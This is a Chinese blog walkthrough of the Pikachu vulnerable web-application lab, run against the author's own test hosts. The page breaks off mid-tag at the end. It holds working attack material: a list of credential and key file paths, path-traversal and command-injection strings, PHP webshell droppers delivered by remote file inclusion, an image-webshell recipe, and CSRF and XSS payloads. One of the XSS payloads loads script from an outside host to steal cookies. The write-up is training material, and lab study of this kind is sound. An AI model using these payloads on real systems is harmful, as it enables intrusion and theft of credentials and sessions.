<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="keywords" content="Hexo Theme Keep"><meta name="description" content="Hexo Theme Keep"><meta name="author" content="涂寐"><title>pikachu_全通关笔记_含源码解析 | 涂寐&#39;s Blogs</title><link rel="stylesheet" href="/css/style.css"><link rel="shortcut icon" href="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/favicon.ico"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/fontawesome.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/regular.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/solid.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/brands.min.css"><script id="hexo-configurations">let KEEP=window.KEEP||{};KEEP.hexo_config={hostname:"example.com",root:"/",language:"zh-CN",path:"search.json"},KEEP.theme_config={toc:{enable:!0,number:!0,expand_all:!1,init_open:!0},style:{primary_color:"#0066cc",logo:"https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/favicon.ico",favicon:"https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/favicon.ico",avatar:"https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/favicon.ico",font_size:"18px",font_family:"STKaiti, STSong, STHeiti",hover:{shadow:!0,scale:!0},first_screen:{enable:!0,header_transparent:!0,background_img:"/images/bg.svg",description:"现在的你不努力||未来的你·该有多狼狈",font_color:null,hitokoto:!1},scroll:{progress_bar:!0,percent:!0}},local_search:{enable:!0,preload:!0},code_copy:{},code_block:{tools:{enable:!0,style:"mac"},highlight_theme:"default"},side_tools:{},pjax:{enable:!0},lazyload:{enable:!0},comment:{enable:!0,use:"valine",valine:{appid:"FrcGiaBdfMQqXAnDFY1gwHbS-gzGzoHsz",appkey:"C0Wy6Sfq0qVag0nm59fc1D12",placeholder:"道友，请留步！请留言~"},gitalk:{github_id:null,github_admins:null,repository:null,client_id:null,client_secret:null},twikoo:{env_id:null,region:null,version:"1.6.7"},waline:{server_url:null,reaction:!1,version:2}},post:{author_label:{enable:!0,auto:!0,custom_label_list:["涂寐"]},word_count:{enable:!0,wordcount:!0,min2read:!0},img_align:"center",copyright_info:!0},version:"3.5.2"},KEEP.language_ago={second:"%s 秒前",minute:"%s 分钟前",hour:"%s 小时前",day:"%s 天前",week:"%s 周前",month:"%s 个月前",year:"%s 年前"},KEEP.language_code_block={copy:"复制代码",copied:"已复制",fold:"折叠代码块",folded:"已折叠"}</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="progress-bar-container"><span class="scroll-progress-bar"></span> <span class="pjax-progress-bar"></span> <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i></div><main class="page-container"><div class="page-main-content"><div class="page-main-content-top"><header class="header-wrapper"><div class="header-content"><div class="left"><a class="logo-image" href="/"><img src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/favicon.ico"> </a><a class="logo-title" href="/">涂寐&#39;s Blogs</a></div><div class="right"><div class="pc"><ul class="menu-list"><li class="menu-item"><a href="/">首页</a></li><li class="menu-item"><a href="/archives">归档</a></li><li class="menu-item"><a href="/tags">标签</a></li><li class="menu-item"><a href="/categories">分类</a></li><li class="menu-item"><a href="/links">友链</a></li><li class="menu-item"><a href="/about">关于</a></li><li class="menu-item search search-popup-trigger"><i class="fas fa-search"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div><div class="icon-item menu-bar"><div class="menu-bar-middle"></div></div></div></div></div><div class="header-drawer"><ul class="drawer-menu-list"><li class="drawer-menu-item flex-center"><a href="/">首页</a></li><li class="drawer-menu-item flex-center"><a href="/archives">归档</a></li><li class="drawer-menu-item flex-center"><a href="/tags">标签</a></li><li class="drawer-menu-item flex-center"><a href="/categories">分类</a></li><li class="drawer-menu-item flex-center"><a href="/links">友链</a></li><li class="drawer-menu-item flex-center"><a href="/about">关于</a></li></ul></div><div class="window-mask"></div><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"JiZItHVhLKBShkL0",ck:"JiZItHVhLKBShkL0"})</script></header></div><div class="page-main-content-middle"><div class="main-content"><div class="fade-in-down-animation"><div class="post-page-container"><div class="article-content-container"><div class="article-title"><span class="title-hover-animation">pikachu_全通关笔记_含源码解析</span></div><div class="article-header"><div class="avatar"><img src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/favicon.ico"></div><div class="info"><div class="author"><span class="name">涂寐</span> <span class="author-label">Lv4</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-calendar-plus"></i>&nbsp; <span class="pc">2022-01-20 23:55:52</span> <span class="mobile">2022-01-20 23:55</span> </span><span class="article-update-date article-meta-item"><i class="fas fa-file-pen"></i>&nbsp; <span class="pc">2022-01-21 01:51:56</span> </span><span class="article-categories article-meta-item"><i class="fas fa-folder"></i>&nbsp;<ul><li><a href="/categories/targettange/">靶场</a>&nbsp;</li></ul></span><span class="article-tags article-meta-item"><i class="fas fa-tags"></i>&nbsp;<ul><li><a href="/tags/pikachu/">pikachu</a>&nbsp;</li><li>| <a href="/tags/success/">通关</a>&nbsp;</li></ul></span><span class="article-pv article-meta-item"><i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content keep-markdown-body"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><ul><li>打 pikachu 靶场断断续续的，直到现在才通关和理解完毕。</li><li>为什么我要拿 pikachu 来练基础呢？第一，开篇有漏洞概念和简要使用叙述；第二，够基础，wp较多</li><li>最满意的，还是对 sql 模块的代码解析，很详很乱（解题时的笔记吗，总有些莫名的思路），但我理解</li></ul></blockquote><h1 id="系统敏感文件路径"><a href="#系统敏感文件路径" class="headerlink" title="系统敏感文件路径"></a>系统敏感文件路径</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// Windowsadmin</span><br><span class="line">c:\boot.ini 					// 查看系统版本</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml	// IIS配置文件</span><br><span class="line">c:\windows\repair\sam				// 存储Windows系统初次安装的密码</span><br><span class="line">c:\ProgramFiles\mysql\my.ini	                // MySQL配置</span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD       // MySQL root密码</span><br><span class="line">c:\windows\php.ini 	                	// php 配置信息</span><br><span class="line">c:\Windows\win.ini 	                	// Windows系统的一个基本系统配置文件</span><br><span class="line"></span><br><span class="line">// Linux</span><br><span class="line">/etc/passwd 			     	                // 账户信息</span><br><span class="line">/etc/shadow 				                // 账户密码文件</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf 	                // Apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd<span class="literal">-vhost</span>.conf	// 虚拟网站配置</span><br><span class="line">/usr/local/app/php5/lib/php.ini 	     	        // PHP相关配置</span><br><span class="line">/etc/httpd/conf/httpd.conf 				// Apache配置文件</span><br><span class="line">/etc/my.conf 						// mysql 配置文件</span><br><span class="line">/proc/mounts						// 记录系统挂载设备</span><br><span class="line">/porc/config.gz					        // 内核配置文件</span><br><span class="line">/var/lib/mlocate/mlocate.db			        // 全文件路径</span><br><span class="line">/porc/self/cmdline					// 当前进程的cmdline参数</span><br><span class="line">/root/.ssh/known_hosts					// 记录每个访问计算机用户的公钥</span><br><span class="line">/root/.bash_history					// 用户历史命令记录文件</span><br><span class="line">/root/.mysql_history				        // mysql历史命令记录文件</span><br><span class="line">/root/.ssh/authorized_keys			        // 公钥相关</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_ras.keystore</span><br></pre></td></tr></table></figure><h1 id="x2F-x2F"><a href="#x2F-x2F" class="headerlink" title="..&#x2F;..&#x2F;"></a>..&#x2F;..&#x2F;</h1><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>对比url，发现是通过参数title来改变调用的文件，假设使用多个..&#x2F;使之达到顶级目录，再向下猜想路径。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 靶场用kali搭的，就访问这 /etc/passwd</span><br><span class="line"># Windows：Windows/win.ini</span><br><span class="line"></span><br><span class="line">http://192.168.135.132:4512/vul/dir/dir_list.php?title=../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220121/image.rebvtd6fai8.webp" alt="image"></p><h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1><h2 id="IcanseeyourABC"><a href="#IcanseeyourABC" class="headerlink" title="IcanseeyourABC"></a>IcanseeyourABC</h2><p>审计网页源代码，总有些意外之喜<br><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220121/image.1ngiwlyfpqps.webp" alt="image"></p><h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p>无验证码直接爆破。</p><h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h2><p>网页源码审计，自身验证码库。丢重放里试，只要不放包，验证码不刷新。</p><h2 id="验证码绕过-on-client-与token防爆破"><a href="#验证码绕过-on-client-与token防爆破" class="headerlink" title="验证码绕过(on client) 与token防爆破?"></a>验证码绕过(on client) 与token防爆破?</h2><p>网页源码审计，前端JS验证。丢重放里试，只要不放包，验证码不刷新；其他，禁用JS。</p><ul><li>CSRF Token Tracker插件，填入host和token，爆破时自动识别token更新，线程调为1，插件识别较慢。</li><li>Intruder模块自带功能Grep-Extract，Refetch response识别网页，网页中选中token值插件自动取值；交叉爆破，密码为参数1，token为参数2，token使用Recursive grep类型字典（递归）。</li></ul><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220121/image.39ez6q33uja0.webp" alt="image"></p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>全称：remote command&#x2F;code execute</p><h2 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h2><p>远程命令执行<br>可以想到，在多个指令结合使用时常用管道连接符 <strong>|</strong> 进行连接，抑或其他命令连接符 <strong>&amp;<strong>、</strong>&amp;&amp;<strong>、</strong>||</strong> 等。<br>docker搭建的靶场，无法ping出结果，测试其他命令类似</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 正常命令结构</span><br><span class="line">	ping 127.0.0.1</span><br><span class="line"># 命令拼接后</span><br><span class="line">	127.0.0.1|ls ../</span><br><span class="line">        127.0.0.1|pwd</span><br><span class="line">	ad||ls</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220121/image.1jiccpj9gzk0.webp" alt="image"></p><h2 id="exec-“evel”"><a href="#exec-“evel”" class="headerlink" title="exec “evel”"></a>exec “evel”</h2><p>远程代码执行</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 直接写入命令查看php信息</span><br><span class="line">    phpinfo();</span><br><span class="line"># 可以使用的系统命令函数/程序执行函数</span><br><span class="line">    system()</span><br><span class="line">    passthru()</span><br><span class="line">    exec()</span><br><span class="line">    shell_exec()</span><br><span class="line">    popen()</span><br><span class="line">    proc_open()</span><br><span class="line">    pcntl_exec()</span><br><span class="line">    ……</span><br><span class="line"># 使用exec函数族</span><br><span class="line"># 调用进程内部执行一个可执行文件</span><br><span class="line"># shell_exec将所有输出流作为字符串返回</span><br><span class="line"># exec默认情况下返回输出的最后一行，但可以将所有输出提供为指定为第二个参数的数组</span><br><span class="line">	echo shell_exec(&#x27;pwd&#x27;);</span><br><span class="line">	echo shell_exec(&#x27;ls ../../&#x27;);</span><br><span class="line">	echo exec(&#x27;whoami&#x27;);</span><br><span class="line">	echo exec(&#x27;ls ../&#x27;);</span><br><span class="line">	exec(&#x27;ls ../&#x27;, $out);var_dump($out);</span><br><span class="line"># 使用命令执行函数system()</span><br><span class="line">	echo system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220121/image.4e769qfhqoo0.webp" alt="image"></p><h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><p>文件包含漏洞</p><h2 id="File-Inclusion-local"><a href="#File-Inclusion-local" class="headerlink" title="File Inclusion(local)"></a>File Inclusion(local)</h2><p>本地文件包含漏洞<br>分析URL可见，filename可控；分析源码，后端直接拼接前端 filename 传入的参数值后交由include()调用。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.135.132/vul/fileinclude/fi_local.php?filename=../../../../../../../etc/passwd&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220121/image.2flbqdm984e8.webp" alt="image"></p><h2 id="File-Inclusion-remote"><a href="#File-Inclusion-remote" class="headerlink" title="File Inclusion(remote)"></a>File Inclusion(remote)</h2><p>远程文件包含漏洞</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 你的allow_url_include没有打开,请在php.ini中打开了再测试该漏洞,记得修改后,重启中间件服务!</span><br><span class="line"># 路径，重启</span><br><span class="line">	/etc/php/8.0/apache2/php.ini</span><br><span class="line"># 自己看程序执行函数，进行理解，这里推荐两篇文章</span><br><span class="line">	https://www.cnblogs.com/0daybug/p/12610834.html</span><br><span class="line">        https://www.cnblogs.com/Rain99-/p/13720299.html</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tumei.txt</span></span><br><span class="line"><span class="comment"># http://192.168.135.132:49154/vul/fileinclude/fi_remote.php?filename=http://192.168.135.131/pikachu/tumei.txt&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span></span><br><span class="line"><span class="comment"># 举例：http://192.168.135.132/vul/fileinclude/tumei.php?tumei=ls</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;tumei.php&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="variable">$txt</span> = <span class="string">&#x27;&lt;?php system($_GET[&quot;tumei&quot;]);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tumei.txt</span></span><br><span class="line"><span class="comment"># 蚁剑连接：http://192.168.135.132/vul/fileinclude/tumei.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;tumei.php&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="variable">$txt</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;tumei&quot;]);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Unsafe-Filedownload"><a href="#Unsafe-Filedownload" class="headerlink" title="Unsafe Filedownload"></a>Unsafe Filedownload</h1><p>不安全的文件下载<br>简单的点击下载，没发现下载接口；瞅下网页源码，哈~</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.135.132/vul/unsafedownload/execdownload.php?filename=../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220121/image.2zp8ebcr2w40.webp" alt="image"></p><h1 id="Unsafe-Fileupload"><a href="#Unsafe-Fileupload" class="headerlink" title="Unsafe Fileupload"></a>Unsafe Fileupload</h1><p>不安全的文件上传漏洞</p><h2 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h2><p>看下网页源码，前端JS验证白名单，直接禁用JS，KO；<br>麻烦点的，改后缀（非图片马），绕过前端验证。<br><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220121/image.7awdjmpmmzk0.webp" alt="image"></p><h2 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h2><p>随便张图，还是爆路径；其他格式，限制白名单。<br>验证上传文件格式？如题1，抓包改后缀，KO。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#　常见的<span class="variable constant_">MIME</span> type</span><br><span class="line">text/html		# 超文本标记语言文本.<span class="property">html</span></span><br><span class="line">text/xml		# xml文档.<span class="property">xml</span></span><br><span class="line">application/xhtml+xml	# <span class="variable constant_">XHTML</span>文档.<span class="property">xhtml</span></span><br><span class="line">application/pdf		# <span class="variable constant_">PDF</span>文档 .<span class="property">pdf</span></span><br><span class="line">application/msword	# <span class="title class_">Microsoft</span> <span class="title class_">Word</span>文件 .<span class="property">word</span></span><br><span class="line">text/plain		# 普通文本.<span class="property">txt</span></span><br><span class="line">application/rtf		# <span class="variable constant_">RTF</span>文本.<span class="property">rtf</span></span><br><span class="line">image/gif		# <span class="variable constant_">GIF</span>图形.<span class="property">gif</span></span><br><span class="line">image/jpeg		# <span class="variable constant_">JPEG</span>图形.<span class="property">ipeg</span>,jpg</span><br></pre></td></tr></table></figure><h2 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h2><p>看下网页源码，无前端验证<br>上传一句话木马改后缀，假图片警告。<br>随便一个文件，非jpg,jpeg,png后缀则判断无后缀。<br>看下源码，大致为比对白名单，重命名文件后拼接白名单后缀。<br>查下getimagesize()函数，大致为校验文件类型（文件头）和限制文件大小！写个图片马呗<br>注：图片马不建议太大，可能不识别。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># abc.txt 内容：&lt;?php phpinfo();?&gt;</span><br><span class="line"># abc.jpg 为任意图片</span><br><span class="line"># tumei.jpg 为图片马</span><br><span class="line">copy abc.jpg/b + abc.txt/a tumei.jpg</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 直接访问上传图片，看到的是以图片形式打开</span><br><span class="line">http://192.168.135.132/vul/unsafeupload/uploads/2021/12/03/54399561a9f8908b517819183869.png</span><br><span class="line"># 配合文件包含漏洞解析图片，即访问如下链接，以PHP形式打开上传的图片，就可以直接叫蚂蚁扛着剑来</span><br><span class="line"># 注：URL勿乱码，中文转URL编码即可，乱码将无法连接一句话木马</span><br><span class="line">http://192.168.135.132/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2021/12/03/54399561a9f8908b517819183869.png&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><h1 id="Over-Permission"><a href="#Over-Permission" class="headerlink" title="Over Permission"></a>Over Permission</h1><p>跨站请求伪造</p><h2 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2><p>URL中最为常见，用某些参数（如?username&#x3D;admin）来管理界面的显示，不防范好直接就是一个水平。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.135.132/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF#</span><br></pre></td></tr></table></figure><h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><p>知道仅对管理员开放操作的URL，但普通用户知晓后亦可访问且操作，赤果果的拥有管理员权限。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.135.132/vul/overpermission/op2/op2_admin_edit.php</span><br></pre></td></tr></table></figure><h1 id="URL重新向"><a href="#URL重新向" class="headerlink" title="URL重新向"></a>URL重新向</h1><p>不安全的url跳转</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># url参数可控，可跳转至任意站点。如下跳转至笔者博客</span><br><span class="line">http://192.168.135.132/vul/urlredirect/urlredirect.php?url=https://0xtlu.me</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220121/image.10zjm70k2huo.webp" alt="image"></p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h2><p>看下tips，拿账号直接登录，登陆后用户有修改用户信息的功能。修改信息界面修改时抓包：方法一、通过BP自带的Generate CSRF Poc功能伪造实现该请求的HTML表单网页，通过远程服务器部署该网页诱导点击；方法二、抓包发现，请求数据附加在URL中且无防护，直接拼接URL再发给其他用户点击。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.135.132/vul/csrf/csrfget/csrf_get_edit.php?sex=%E7%94%B7&amp;phonenum=%E6%9D%8E%E7%99%BD&amp;add=afaf&amp;email=afafwe&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220121/image.3z41ok96qxi0.webp" alt="image"></p><h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h2><p>请求数据在请求包的包体中。抓包，无token验证，尝试通过BP的Change request method功能将post请求转成get请求形式来实现漏洞，无果。如题1方法一，发现点击钓鱼网页后直接报错，重启KO。建议，网页伪装进行美化，更具诱导性。<br><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220121/image.4t1578i4nag0.webp" alt="image"><br><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220121/image.4iao8jfdm8m0.webp" alt="image"></p><h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h2><p>抓包，get+token，多次抓包，token随机，尝试如题1方法二，无解。<br><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220121/image.7hfwh70ejt80.webp" alt="image"></p><h1 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h1><p>跨站脚本</p><h2 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h2><p>检测一波转义和过滤’&lt;;6(6&#x3D;6&amp;6)6&gt;6&#x2F;“，无过滤转义，写入img标签<code>&lt;img src=1&gt;</code>直接原形式读取，KO；深入利用，前端限制输入长度，方法一：看下URL，在上面直接修改输入；方法二：F12直接更改长度，错误的图片触发cookie弹窗：<code>&lt;img src=1 onerror=&#39;alert(document.cookie)&#39;&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.135.132/vul/xss/xss_reflected_get.php?message=&lt;img src=1 onerror=&#x27;alert(document.cookie)&#x27;&gt;&amp;submit=submit</span><br></pre></td></tr></table></figure><h2 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h2><p>如题1，前端却无法修改输入长度；抓包，修改表单中的输入修改，KO<br><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220121/image.6rbkjwo7hdg0.webp" alt="image"></p><h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>如题1，KO。留言板内容存储数据库，当他人访问该页面亦会弹出cookie窗口。</p><h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><p>随便输入，有条跳转提示，URL重定向？别逗了，这测XSS。构造标签闭合，点击事件触发弹窗，KO</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 拼接标签，#为链接到当前页面，输入的单引号&#x27;输出后显示为双引号</span><br><span class="line"># # 号可替换为任意可访问的链接</span><br><span class="line"># &#x27; onclick=&quot;alert(123)&quot;&gt;	</span><br><span class="line">https://0xtlu.me&#x27; onclick=&quot;alert(123)&quot;&gt;	</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220121/image.250d9sznfvs0.webp" alt="image"></p><h2 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h2><p>如题4，仅是内嵌两层标签，需要点击新标签方能触发。</p><h2 id="xss盲打"><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h2><p>随便输入xss语句，没过滤，后台也确实可见，找个盲打平台搞他，直接拿到cookie。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/tExtArEa&gt;&#x27;&quot;&gt;&lt;sCRiPt sRC=/</span><span class="regexp">/xsshs.cn/</span>aPwe&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><h2 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h2><p>直接给他整个img标签，过滤呢？实现script标签，我输入呢？直接被干掉，变下大小写，KO。看下源码，仅过滤script标签。尝试双尖号绕过，KO。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span 